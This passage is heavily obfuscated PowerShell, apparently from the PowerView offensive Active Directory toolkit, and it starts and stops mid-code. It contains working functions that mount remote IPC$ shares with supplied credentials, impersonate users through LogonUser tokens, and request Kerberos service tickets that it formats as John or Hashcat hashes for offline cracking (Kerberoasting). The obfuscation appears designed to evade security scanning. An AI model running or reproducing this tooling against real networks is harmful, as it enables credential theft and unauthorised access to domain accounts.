            ForEach (${UAC`ValUE} in ${U`Ac`VAlUEs}.("{0}{1}{2}" -f 'GetE','numerato','r').Invoke()) {
                if ( (${Va`lue} -band ${u`ACv`Alue}."V`AlUE") -eq ${uACv`AL`Ue}."vAl`Ue") {
                    ${R`esultUaC`ValU`es}.("{1}{0}"-f 'd','Ad').Invoke(${U`AcVA`lue}."n`Ame", "$($UACValue.Value)")
                }
            }
        }
        ${Re`S`UltU`AC`VALUEs}
    }
}


function geT-`p`RincI`P`ALcO`NText {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}"-f 'ce','s','PSShouldPro','s'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(posITiON = 0, MAnDatorY = ${tR`Ue})]
        [Alias({"{1}{2}{0}" -f'me','Gro','upNa'}, {"{1}{4}{3}{2}{0}" -f'ty','GroupI','i','t','den'})]
        [String]
        ${id`e`NTiTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMA`in},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EdeN`TIAL} =  (&("{1}{2}{0}"-f 'blE','va','rIA')  ('5r0'+'VK') )."Va`LUe"::"e`mPTY"
    )

    &("{1}{0}{2}"-f'd','A','d-Type') -AssemblyName ("{9}{7}{4}{5}{1}{2}{3}{8}{6}{0}"-f'nt','es.Ac','countM','an','r','ectoryServic','me','.Di','age','System')

    try {
        if (${psbo`UN`DP`AraMEtErs}[("{2}{0}{1}" -f 'm','ain','Do')] -or (${IDE`NTity} -match ((("{2}{3}{0}{1}"-f '0pD0pD','.+','.','+'))."RepLA`CE"(([ChAR]48+[ChAR]112+[ChAR]68),'\')))) {
            if (${IDenT`ITy} -match ((("{0}{1}{2}" -f'.+','b','lZblZ.+')).("{0}{1}" -f'REP','LaCE').Invoke('blZ','\'))) {
                
                ${CoNV`erT`ED`Ide`NtIty} = ${iD`EnT`ity} | &("{1}{0}{2}{3}" -f 'vert-A','Con','DNam','e') -OutputType ("{0}{1}"-f'Canoni','cal')
                if (${CoNv`erteDiD`En`TITY}) {
                    ${c`OnNeC`TtARg`eT} = ${Con`VErTEd`I`dENTITy}.("{2}{0}{1}"-f 'tri','ng','SubS').Invoke(0, ${c`oNV`ErtEDi`DenT`ItY}.("{0}{1}"-f 'Ind','exOf').Invoke('/'))
                    ${Obj`EcT`I`DentItY} = ${Id`EnT`ItY}.("{0}{1}" -f 'Sp','lit').Invoke('\')[1]
                    &("{0}{3}{1}{2}"-f 'Writ','os','e','e-Verb') ('[Get-Princ'+'i'+'palCont'+'ext] '+'Binding'+' '+'to'+' '+'doma'+'in'+' '+"'$ConnectTarget'")
                }
            }
            else {
                ${objec`Ti`DEn`TITy} = ${I`D`e`NtIty}
                &("{2}{0}{3}{1}" -f 'e-V','rbose','Writ','e') ('['+'Ge'+'t-PrincipalCont'+'ext]'+' '+'Bindin'+'g'+' '+'to'+' '+'do'+'ma'+'in '+"'$Domain'")
                ${c`oNN`EC`TTa`RgEt} = ${D`omAIn}
            }

            if (${psb`Oundp`ARAMEt`E`Rs}[("{3}{0}{2}{1}" -f'edenti','l','a','Cr')]) {
                &("{2}{0}{1}" -f 'te-V','erbose','Wri') ("{14}{1}{5}{4}{11}{7}{2}{6}{9}{3}{10}{0}{8}{12}{13}" -f'e','Ge','xt] U','lt','rinci','t-P','sin','e',' credent','g a','ernat','palCont','ial','s','[')
                ${cONT`e`xt} = &("{1}{2}{0}"-f '-Object','N','ew') -TypeName ("{8}{4}{6}{14}{9}{11}{12}{0}{2}{5}{1}{10}{3}{13}{7}"-f'un','nt.','tMan','rincip','y','ageme','stem.Dir','t','S','rvic','P','es.Ac','co','alContex','ectorySe') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"dOM`Ain", ${C`ONNecTtA`RGet}, ${c`RedE`Ntial}."U`SE`RnaMe", ${CrE`dEnT`Ial}.("{3}{0}{2}{1}" -f 'rkCr','dential','e','GetNetwo').Invoke()."PasS`WO`RD")
            }
            else {
                ${co`N`TexT} = &("{1}{0}{2}"-f'Obj','New-','ect') -TypeName ("{2}{1}{0}{7}{6}{11}{8}{12}{4}{10}{5}{3}{9}" -f'm','yste','S','ipalCont','ent.P','nc','toryServ','.Direc','ccountMana','ext','ri','ices.A','gem') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"doma`iN", ${c`oN`N`Ectt`ArgEt})
            }
        }
        else {
            if (${p`Sb`O`UNDP`A`RaMeTERs}[("{0}{1}{2}"-f 'C','redent','ial')]) {
                &("{2}{1}{0}" -f 'bose','e-Ver','Writ') ("{7}{5}{4}{6}{1}{3}{2}{0}{8}"-f' cred','ext] ','lternate','Using a','p','Get-Princi','alCont','[','entials')
                ${D`omA`inNa`mE} = &("{1}{0}{2}" -f 't-','Ge','Domain') | &("{0}{2}{1}"-f'Sele','ct','ct-Obje') -ExpandProperty ("{1}{0}" -f 'e','Nam')
                ${co`Nte`xt} = &("{1}{2}{0}" -f 'ct','New','-Obje') -TypeName ("{5}{3}{4}{8}{7}{1}{6}{2}{0}{9}" -f't.Principal','ces','gemen','m.','Direct','Syste','.AccountMana','i','oryServ','Context') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"d`OMaIn", ${D`Om`Ainn`AMe}, ${CR`ED`e`NTIAL}."USE`RNAMe", ${CRE`Den`T`iAl}.("{2}{1}{0}{5}{3}{4}"-f 'twork','etNe','G','en','tial','Cred').Invoke()."Pa`SSw`ord")
            }
            else {
                ${cO`Nt`EXT} = &("{2}{1}{0}"-f'ject','ew-Ob','N') -TypeName ("{0}{8}{3}{9}{7}{4}{5}{1}{2}{6}" -f'Sy','.Prin','c','em.D','un','tManagement','ipalContext','Acco','st','irectoryServices.') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"dom`AiN")
            }
            ${o`Bj`ectideNT`I`Ty} = ${i`dEN`TITY}
        }

        ${O`UT} = &("{0}{2}{1}"-f'N','-Object','ew') ("{1}{0}{2}" -f'je','PSOb','ct')
        ${O`Ut} | &("{2}{0}{1}"-f'Mem','ber','Add-') ("{1}{2}{0}"-f'perty','Notepr','o') ("{1}{0}"-f'ontext','C') ${c`OnTeXT}
        ${o`UT} | &("{3}{1}{2}{0}" -f 'er','-Me','mb','Add') ("{2}{1}{0}{3}"-f'r','prope','Note','ty') ("{2}{1}{0}"-f'ty','i','Ident') ${oBJ`ect`IdeN`T`iTY}
        ${O`Ut}
    }
    catch {
        &("{2}{0}{1}"-f 'ri','te-Warning','W') ('[Get-Pri'+'ncipa'+'lCon'+'te'+'x'+'t'+']'+' '+'Er'+'ro'+'r '+'cre'+'ating '+'bin'+'ding'+' '+'for'+' '+'obj'+'ect '+"('$Identity') "+'co'+'ntext'+' '+': '+"$_")
    }
}


function aDd-`R`eMOTeC`OnNeC`TI`oN {


    [CmdletBinding(dEfauLtpArAMETERsETNAMe = {"{2}{3}{1}{0}"-f 'me','Na','Comput','er'})]
    Param(
        [Parameter(PositioN = 0, MaNdATory = ${T`RUe}, paRamETErsEtNAmE = "Co`mpUTeRn`A`Me", vAlUEfroMpiPelIne = ${tR`Ue}, vaLuEfRompIPELinebYprOpErTyNAme = ${tR`UE})]
        [Alias({"{0}{1}"-f 'Hos','tName'}, {"{0}{2}{1}{3}"-f 'dns','ost','h','name'}, {"{0}{1}" -f'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${comp`U`TE`RNamE},

        [Parameter(posiTION = 0, paRAmeTerSEtNAmE = "pa`TH", MaNdATORy = ${t`RUE})]
        [ValidatePattern({(("{1}{6}{5}{4}{3}{2}{0}{7}" -f'gf','4gf4','4','gf','4','*','gf4gf4gf.','.*'))  -CREPlaCE([cHar]52+[cHar]103+[cHar]102),[cHar]92})]
        [String[]]
        ${pa`TH},

        [Parameter(MaNDaTOry = ${T`RUe})]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Crede`Nti`AL}
    )

    BEGIN {
        ${nE`TRe`soURceIn`StanCE} =  (  &("{0}{1}"-f 'VarIABL','e')  ("{0}{1}"-f '3','pFgy') -valueOnL  )::("{2}{3}{1}{4}{0}"-f'e','nsta','Crea','teI','nc').Invoke(${Net`ResOU`R`CEw})
        ${NeTres`o`UR`ceI`NstAn`cE}."dw`T`ype" = 1
    }

    PROCESS {
        ${pa`THS} = @()
        if (${pSbOU`NdPAr`Amet`erS}[("{1}{2}{0}"-f'e','Co','mputerNam')]) {
            ForEach (${TARgeT`cOMPUT`e`R`N`AME} in ${C`O`MPUTERnamE}) {
                ${Ta`RgetC`oMp`UT`ErnAME} = ${taR`GetcoM`P`UtERnA`me}.("{1}{0}"-f 'm','Tri').Invoke('\')
                ${P`At`hs} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${PAt`HS} += ,${pa`Th}
        }

        ForEach (${Ta`R`gET`pAth} in ${PA`ThS}) {
            ${NETresouRc`ei`NStAn`ce}."lPRe`mO`TenaME" = ${tarG`eTpA`Th}
            &("{1}{3}{4}{2}{0}"-f'ose','W','rb','ri','te-Ve') ('['+'Add'+'-R'+'emoteConne'+'cti'+'on]'+' '+'A'+'tt'+'emp'+'ting '+'to'+' '+'mou'+'nt: '+"$TargetPath")

            
            
            ${r`EsU`lT} = ${M`PR}::("{0}{1}{2}{3}"-f 'WNe','tAddCon','necti','on2W').Invoke(${nETr`e`s`oUrCe`i`NSTAnCe}, ${creDe`N`Tial}.("{0}{2}{3}{4}{6}{5}{1}"-f 'Ge','ntial','tNe','t','wo','kCrede','r').Invoke()."P`A`sSWOrd", ${CR`ED`ENt`Ial}."USe`RnA`ME", 4)

            if (${rE`S`ULt} -eq 0) {
                &("{3}{2}{0}{4}{1}"-f'Verb','se','ite-','Wr','o') ("$TargetPath "+'succes'+'s'+'full'+'y '+'mou'+'n'+'ted')
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function rE`MO`V`E`-ReMOtE`CoNne`ctIOn {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{5}{12}{9}{2}{4}{6}{10}{11}{8}{0}{7}{3}"-f 'ct','P','hould','ons','Proce','SU','ssForSt','i','angingFun','eS','at','eCh','s'}, '')]
    [CmdletBinding(deFAuLtpARamETeRsEtnAmE = {"{2}{3}{1}{0}"-f'ame','erN','C','omput'})]
    Param(
        [Parameter(PosITiON = 0, mandatORY = ${t`RUE}, ParameTerSETNAME = "CompUte`R`NA`Me", vaLUEfroMPIpelinE = ${t`Rue}, vaLuefRomPIPelinEBYpRopeRtYNAMe = ${Tr`Ue})]
        [Alias({"{2}{1}{0}" -f 'ame','ostN','H'}, {"{3}{2}{1}{0}"-f'ame','ostn','sh','dn'}, {"{0}{1}"-f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CO`M`PUteRnamE},

        [Parameter(PositiOn = 0, PARaMetersETname = "P`ATH", MaNdaTORy = ${TR`Ue})]
        [ValidatePattern({(("{3}{0}{4}{1}{2}"-f'.*5n','ny','.*','5ny5ny5ny5ny','y5')) -replACe '5ny',[CHAR]92})]
        [String[]]
        ${p`ATh}
    )

    PROCESS {
        ${p`ATHS} = @()
        if (${pSBo`U`NDParaMETe`RS}[("{0}{2}{1}"-f 'Co','rName','mpute')]) {
            ForEach (${TArGEtc`O`mPuT`eRna`me} in ${CO`MpuTe`RN`Ame}) {
                ${targeTC`ompu`T`E`RN`AMe} = ${tarGeTc`oMPUTEr`N`AmE}.("{0}{1}"-f 'Tri','m').Invoke('\')
                ${P`At`hs} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${pa`T`hS} += ,${p`ATH}
        }

        ForEach (${TaR`G`ETPATh} in ${P`AThs}) {
            &("{0}{1}{2}"-f 'Wr','i','te-Verbose') ('[Remov'+'e'+'-'+'Remote'+'Co'+'nnection] '+'Att'+'e'+'mpting '+'t'+'o '+'u'+'nmou'+'n'+'t: '+"$TargetPath")
            ${R`eS`UlT} = ${m`PR}::("{0}{2}{3}{1}" -f 'WNetC','onnection2','anc','elC').Invoke(${Ta`RGE`TPa`Th}, 0, ${t`RUe})

            if (${resU`lT} -eq 0) {
                &("{0}{3}{1}{2}" -f 'Wri','-','Verbose','te') ("$TargetPath "+'s'+'ucces'+'sf'+'ully '+'um'+'moun'+'t'+'ed')
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function I`NvOke-USErim`P`ErsON`ATiOn {


    [OutputType([IntPtr])]
    [CmdletBinding(DefAuLtParaMEtERSeTnAme = {"{2}{0}{1}"-f'n','tial','Crede'})]
    Param(
        [Parameter(mANdATorY = ${T`RUe}, pArAmEteRsETname = "cR`ede`Nt`iaL")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REDent`IaL},

        [Parameter(ManDAtoRY = ${t`Rue}, paRAMeTerSeTName = "tO`kENh`An`DLE")]
        [ValidateNotNull()]
        [IntPtr]
        ${tOKEnHA`ND`LE},

        [Switch]
        ${qU`I`et}
    )

    if (( (&("{1}{0}" -f'bLE','vARIa')  ('J'+'f1'))."v`AluE"::"cURr`ENtTh`ReAd".("{0}{3}{2}{1}"-f 'GetApartme','e','Stat','nt').Invoke() -ne 'STA') -and (-not ${ps`B`OUndPa`Ram`eterS}[("{1}{0}" -f'uiet','Q')])) {
        &("{1}{0}{2}{3}" -f 'Wa','Write-','rnin','g') ("{37}{31}{6}{10}{16}{15}{9}{21}{19}{7}{32}{5}{28}{35}{12}{34}{4}{8}{17}{18}{25}{2}{36}{22}{27}{0}{24}{29}{30}{3}{26}{14}{23}{38}{13}{1}{20}{33}{11}" -f'ment ',' ','ingle-th','en','r','e','p','e','en','tion','e','.',' n','tion may not','mp','a','rson','tly in ','a ','wersh','wor','] po','aded apa','erso','stat','s',' i','rt','xe','e, ','tok','UserIm','ll.','k','ot cur',' is','re','[Invoke-','na')
    }

    if (${P`sbO`UNdp`ArAMeterS}[("{0}{1}{2}{3}"-f 'To','ken','H','andle')]) {
        ${lO`Go`N`TOken`hA`NdLe} = ${tOke`N`hAN`dLE}
    }
    else {
        ${lO`G`O`NtOkEnHA`NDLe} =   (&("{1}{2}{0}"-f 'aBle','vAR','I')  ("Oy"+"9"))."vA`LUe"::"ze`Ro"
        ${n`ETwOr`KC`REdENTial} = ${CreDenT`i`AL}.("{4}{0}{3}{1}{2}" -f'tN','tworkCr','edential','e','Ge').Invoke()
        ${uSE`RDo`mAIN} = ${nEtWoR`k`CrEDe`Nt`iAL}."D`omaIn"
        ${U`S`ErNA`mE} = ${net`w`OrKc`R`edenTI`Al}."USeRn`A`Me"
        &("{0}{2}{1}"-f'Write','g','-Warnin') "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        ${r`ESu`Lt} = ${a`DvAp`I32}::("{1}{0}"-f'r','LogonUse').Invoke(${u`SeRN`AME}, ${uSEr`DoM`A`In}, ${n`etwORkCR`eDen`TI`AL}."P`A`SSWorD", 9, 3, [ref]${L`O`G`on`TOK`EnHaNdLE});${L`A`stERrOr} =   ( &("{1}{2}{0}{3}" -f'RIA','Get','-va','bLe')  ("{1}{0}"-f 'X','o5rhL')  -Va  )::("{4}{0}{2}{1}{3}"-f 'as','Win3','t','2Error','GetL').Invoke();

        if (-not ${RE`SU`lT}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    ${r`Es`UlT} = ${aDv`Ap`i`32}::("{3}{0}{2}{1}" -f'ersonateLog','ser','gedOnU','Imp').Invoke(${lOG`onT`O`k`enHAn`Dle})

    if (-not ${Re`S`ULT}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{1}{2}{0}"-f'erbose','Write-','V') ("{17}{1}{3}{18}{4}{11}{13}{9}{8}{6}{7}{0}{5}{15}{10}{16}{12}{19}{2}{14}"-f ' credenti','Invoke-UserIm','rsonat','p','rso','a','at','e','n','Alter',' succ','nati','lly imp','on] ','ed','ls','essfu','[','e','e')
    ${Lo`gONTO`Ken`h`ANd`le}
}


function INVOk`e-`RE`VER`TTOs`Elf {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${TO`ke`NhaNd`LE}
    )

    if (${PSBOunDPAr`Am`E`TERs}[("{0}{2}{1}" -f'TokenHan','le','d')]) {
        &("{3}{1}{2}{0}"-f 'rning','it','e-Wa','Wr') ("{12}{25}{2}{24}{19}{3}{18}{13}{9}{20}{23}{16}{1}{22}{10}{14}{15}{5}{11}{4}{7}{17}{0}{21}{6}{8}"-f ' to','n ','Reve','v','ogon','sing ','hand','User(','le','ng to','n','L','[','rti','d',' clo','rsonatio',')','e','elf] Re','ken i','ken ','a','mpe','rtToS','Invoke-')
        ${RESU`Lt} = ${Ke`RNEl`32}::("{0}{3}{2}{1}" -f 'Cl','e','Handl','ose').Invoke(${tO`KEnhA`N`DLE})
    }

    ${re`S`ULt} = ${ad`VA`PI32}::("{1}{0}{3}{2}" -f'er','Rev','lf','tToSe').Invoke();${l`A`StERROr} =  ( &("{1}{2}{0}"-f'IABLE','GET-','vaR')  ("{0}{1}{2}"-f 'O','5rH','Lx')  -VALu  )::("{1}{0}{2}{3}" -f'et','G','L','astWin32Error').Invoke();

    if (-not ${RES`U`lt}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{0}{2}{1}"-f'Wr','se','ite-Verbo') ("{2}{13}{9}{6}{4}{8}{12}{7}{0}{10}{11}{3}{5}{1}"-f'en imp','rted','[',' successfully','tT',' reve','ver','f] Tok','o','Re','erson','ation','Sel','Invoke-')
}


function gE`T-doma`I`NsPnTi`C`ket {


    [OutputType({"{5}{2}{4}{3}{0}{1}"-f'k','et','werView','PNTic','.S','Po'})]
    [CmdletBinding(DefAulTpArAmeTerSETName = {"{1}{0}" -f 'N','RawSP'})]
    Param (
        [Parameter(POSITION = 0, parAmetErsEtNAme = "r`AWS`Pn", maNdaTory = ${tr`Ue}, VAlueFromPipELInE = ${tR`Ue})]
        [ValidatePattern({"{0}{1}"-f '.*/.','*'})]
        [Alias({"{1}{3}{4}{0}{2}"-f'nc','Service','ipalName','Pr','i'})]
        [String[]]
        ${s`pn},

        [Parameter(pOSITiON = 0, paRamEterseTnAMe = "US`eR", MANdaTORY = ${tR`Ue}, vaLUEFROMPIpeLiNE = ${t`Rue})]
        [ValidateScript({ ${_}."PsoB`j`ect"."TyP`eNA`m`es"[0] -eq ("{2}{3}{0}{4}{1}"-f 'Vi','r','P','ower','ew.Use') })]
        [Object[]]
        ${U`SEr},

        [ValidateSet({"{0}{1}"-f'J','ohn'}, {"{2}{0}{1}"-f 'hca','t','Has'})]
        [Alias({"{1}{0}"-f 'mat','For'})]
        [String]
        ${o`UTp`UTf`Or`mAt} = ("{0}{1}" -f'J','ohn'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreDEn`T`i`Al} =   ( &("{1}{0}{2}"-f'I','vaR','ABLE')  ("{0}{1}"-f '5','R0Vk')  -VALueOn)::"em`PTY"
    )

    BEGIN {
        ${n`UlL} =  (&("{0}{1}" -f 'D','IR')  ('variaBLe'+':Ds'+'2b'+'U')  )."VaL`UE"::("{4}{0}{2}{3}{1}"-f'oad','Name','WithPartia','l','L').Invoke(("{1}{2}{5}{4}{6}{3}{0}"-f 'del','S','ystem.Id','tyMo','nt','e','i'))

        if (${psboU`N`D`paRaME`TERs}[("{1}{0}{3}{2}" -f'enti','Cred','l','a')]) {
            ${l`O`g`ONtoKEn} = &("{4}{1}{5}{3}{0}{2}"-f'onati','nvok','on','serImpers','I','e-U') -Credential ${C`REd`ENTIAL}
        }
    }

    PROCESS {
        if (${P`SB`ou`NdparAmETeRs}[("{0}{1}" -f'U','ser')]) {
            ${T`ARge`TOB`jE`CT} = ${US`Er}
        }
        else {
            ${t`ARG`e`T`OBJeCt} = ${S`Pn}
        }

        ForEach (${ObJ`ECT} in ${tArG`EtOB`JECT}) {
            if (${P`S`Boun`dParAmET`erS}[("{0}{1}" -f 'Use','r')]) {
                ${USe`RSpN} = ${Obj`Ect}."s`eRVICe`p`RInCipaln`AMe"
                ${SAm`A`cc`ountNA`Me} = ${Ob`jecT}."sA`MacCOunTn`A`mE"
                ${dI`s`TIng`UisHED`Na`me} = ${obJ`EcT}."dIsting`UishE`D`NamE"
            }
            else {
                ${Us`e`RsPn} = ${ObJ`E`ct}
                ${s`AmaCC`OUNTna`mE} = ("{1}{0}{2}"-f 'NKN','U','OWN')
                ${DISTi`NGUI`ShED`NAME} = ("{1}{2}{0}" -f'WN','UN','KNO')
            }

            
            if (${u`Se`RsPn} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${useR`spn} = ${UsErS`pn}[0]
            }

            try {
                ${tIc`K`eT} = &("{3}{2}{0}{1}"-f 'j','ect','-Ob','New') ("{1}{9}{14}{16}{13}{5}{11}{0}{15}{17}{4}{3}{10}{12}{6}{8}{2}{7}"-f 'T','S','rSecu','e','.K','yModel','ques','rityToken','to','yste','r','.','berosRe','dentit','m.','o','I','kens') -ArgumentList ${use`RS`pn}
            }
            catch {
                &("{0}{2}{1}" -f 'Writ','ng','e-Warni') ('[Get-Domai'+'n'+'SPNTick'+'et'+'] '+'E'+'rror '+'requ'+'esting'+' '+'tic'+'k'+'et '+'f'+'or '+'SP'+'N '+"'$UserSPN' "+'fr'+'om '+'u'+'ser '+"'$DistinguishedName' "+': '+"$_")
            }
            if (${Tic`k`Et}) {
                ${tIC`ke`TBYtEsT`REaM} = ${Tic`K`eT}.("{2}{0}{1}" -f'eq','uest','GetR').Invoke()
            }
            if (${t`I`CKETB`yte`S`TREaM}) {
                ${O`UT} = &("{1}{2}{0}"-f'Object','N','ew-') ("{0}{2}{1}" -f 'PS','t','Objec')

                ${TI`Ck`et`HeXStRE`AM} =   (&("{1}{0}" -f'ci','G') ("{2}{1}{0}{3}"-f 'aBL','RI','va','e:lsjZv6') )."V`AluE"::("{2}{0}{1}" -f'o','String','T').Invoke(${t`icKe`T`ByTe`STreaM}) -replace '-'

                
                
                if(${ti`c`k`eTHExSTR`eAm} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${Et`ypE} =   ${SH`BA5}::("{0}{1}"-f'ToByt','e').Invoke( ${MAT`Ches}."E`T`ypeleN", 16 )
                    ${CIPh`ErtEX`T`lEn} =  ( &("{2}{0}{1}" -f'vaRIa','bLe','GET-')  ("{1}{0}" -f'ba5','Sh'))."val`UE"::("{1}{0}" -f'32','ToUInt').Invoke(${m`A`TcheS}."cI`Ph`e`R`TeXTLen", 16)-4
                    ${ciPH`E`RtExT} = ${M`At`CHeS}."DaT`A`ToeNd".("{0}{1}{2}"-f'Sub','strin','g').Invoke(0,${C`iPhE`RtE`xtLen}*2)

                    
                    if(${MAtch`ES}."d`AT`AtOeNd".("{2}{1}{0}"-f'tring','s','Sub').Invoke(${ciphErTE`xT`l`EN}*2, 4) -ne ("{1}{0}" -f '482','A')) {
                        &("{2}{3}{0}{1}"-f'i','ng','Writ','e-Warn') ('Er'+'ror'+' '+'parsing'+' '+'c'+'iphe'+'rtext'+' '+'for'+' '+'the'+' '+'SP'+'N '+' '+('{0}({'+'0}Ti'+'cket.S'+'e'+'rviceP'+'rinci'+'pa'+'lNam'+'e). ')-f[cHaR]36+'Use'+' '+'t'+'he '+'TicketByteHe'+'xStre'+'am'+' '+'fie'+'l'+'d '+'and'+' '+'extra'+'ct '+'th'+'e '+'ha'+'sh '+'offl'+'ine '+'wi'+'th '+('Get-K'+'e'+'rberoas'+'tHa'+'s'+'hFromAPReq{0}')-F [ChAr]34)
                        ${h`Ash} = ${N`ULl}
                        ${O`Ut} | &("{1}{2}{0}"-f 'mber','Add-','Me') ("{0}{3}{2}{1}"-f 'N','erty','teprop','o') ("{1}{0}{2}{3}{4}" -f 'ic','T','ketByteHexStr','e','am') ( (&("{2}{0}{1}" -f'te','M','Get-i')  ("{1}{2}{3}{0}" -f'357','vArI','A','ble:')  )."VAL`Ue"::("{1}{0}" -f 'tring','ToS').Invoke(${t`IcKeT`BY`TE`STRe`Am}).("{0}{1}"-f 'Repla','ce').Invoke('-',''))
                    } else {
                        ${Ha`SH} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${o`UT} | &("{2}{0}{1}" -f '-','Member','Add') ("{0}{2}{1}" -f'Noteprop','rty','e') ("{0}{2}{1}{3}"-f'TicketByteHe','ea','xStr','m') ${n`Ull}
                    }
                } else {
                    &("{2}{0}{1}" -f 'ite-W','arning','Wr') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    ${ha`sH} = ${nu`LL}
                    ${O`Ut} | &("{0}{2}{1}"-f'A','er','dd-Memb') ("{0}{1}{2}"-f'N','ot','eproperty') ("{2}{1}{3}{0}"-f 'am','eHexSt','TicketByt','re') (  ( &("{1}{0}" -f'em','IT') ('vaRIABl'+'E'+':'+'357') )."v`AlUE"::("{1}{0}"-f 'tring','ToS').Invoke(${TIC`KET`BY`TESTR`eAM}).("{0}{2}{1}" -f'Rep','ace','l').Invoke('-',''))
                }

                if(${h`ASH}) {
                    if (${O`Ut`PUTFORMAT} -match ("{0}{1}" -f 'Jo','hn')) {
                        ${HaSh`F`O`RMaT} = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (${DIs`T`i`N`gUiSH`eDNAMe} -ne ("{2}{1}{0}"-f'N','NOW','UNK')) {
                            ${U`SE`Rd`OMaIn} = ${D`iST`INguIsHE`DN`Ame}.("{2}{1}{0}"-f'tring','ubS','S').Invoke(${Dis`T`INGUish`E`Dna`Me}.("{0}{1}" -f'Ind','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${use`RdO`main} = ("{2}{1}{0}"-f 'WN','NO','UNK')
                        }

                        
                        ${has`Hf`ormaT} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${O`Ut} | &("{1}{0}{2}" -f'Me','Add-','mber') ("{1}{2}{0}" -f'ty','Noteprop','er') ("{0}{1}"-f'Has','h') ${H`AsHFO`Rmat}
                }

                ${o`Ut} | &("{1}{2}{0}{3}"-f 'Memb','A','dd-','er') ("{0}{1}{2}" -f'No','tepr','operty') ("{1}{0}{2}"-f 'A','Sam','ccountName') ${SaMacc`OUn`T`N`AmE}
                ${O`UT} | &("{3}{1}{2}{0}" -f 'ber','dd','-Mem','A') ("{0}{1}{3}{2}" -f 'Note','pro','ty','per') ("{1}{3}{0}{2}" -f 'ed','Distin','Name','guish') ${Di`s`TInGUishEdnA`ME}
                ${o`Ut} | &("{1}{0}{2}" -f'd','A','d-Member') ("{0}{2}{1}{3}" -f 'Note','ert','prop','y') ("{0}{2}{1}{3}{4}"-f'S','Princi','ervice','pa','lName') ${TI`CKET}."sE`Rvicepr`inc`i`P`AlNAME"
                ${o`UT}."pSOb`j`ECT"."tY`pe`NaMEs".("{0}{1}" -f'In','sert').Invoke(0, ("{3}{0}{1}{2}"-f'werView.SPNT','ic','ket','Po'))
                &("{2}{1}{0}" -f't','-Outpu','Write') ${O`Ut}
            }
        }
    }

    END {
        if (${Lo`gOn`TO`KEN}) {
            &("{2}{3}{0}{1}"-f'T','oSelf','Inv','oke-Revert') -TokenHandle ${l`O`GOn`TOKEn}
        }
    }
}


function INVOK`e-`kErbErO`ASt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{0}{4}" -f'd','houl','P','SS','Process'}, '')]
    [OutputType({"{2}{0}{1}{3}"-f 'erView.SP','NTic','Pow','ket'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSITiON = 0, valUEFROMpipELINe = ${tR`UE}, vALUeFroMPipelInEbYPRoPerTYnaME = ${T`RuE})]
        [Alias({"{2}{0}{4}{3}{1}" -f 'stin','ame','Di','ishedN','gu'}, {"{3}{1}{4}{2}{0}"-f'me','Ac','tNa','Sam','coun'}, {"{0}{1}"-f'N','ame'}, {"{1}{0}{3}{2}{4}" -f 'm','Me','nguis','berDisti','hedName'}, {"{1}{2}{0}" -f 'e','MemberN','am'})]
        [String[]]
        ${I`de`NtITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`A`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'ilt','F','er'})]
        [String]
        ${lDaPfI`lT`Er},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'Path','ADS'})]
        [String]
        ${SE`ArC`Hba`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}{4}"-f'r','Doma','inCon','t','oller'})]
        [String]
        ${seR`VeR},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{0}{1}{2}" -f'On','eL','evel'}, {"{2}{1}{0}" -f'ee','btr','Su'})]
        [String]
        ${se`A`RcHsCO`pe} = ("{0}{1}" -f 'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`SuLtpagESi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seR`Ve`RT`I`mELImiT},

        [Switch]
